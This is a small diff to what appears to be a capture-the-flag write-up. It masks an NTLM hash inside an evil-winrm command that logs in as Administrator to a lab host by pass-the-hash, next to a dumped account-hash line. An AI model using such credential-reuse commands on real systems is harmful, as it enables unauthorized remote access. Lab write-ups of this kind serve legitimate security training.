@@ -296,7 +296,7 @@ DefaultAccount:503:aa5b51404ee:31d6cfe0d16ae931b73c59d7e0
 ## Login as Administrator with the hashe found
 
 ```
-root@ubuntu:~# evil-winrm -i 10.10.250.157 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
+root@ubuntu:~# evil-winrm -i 10.10.250.157 -u Administrator -H c25[HIDDEN]c3b09d
 
 Evil-WinRM shell v2.3
 
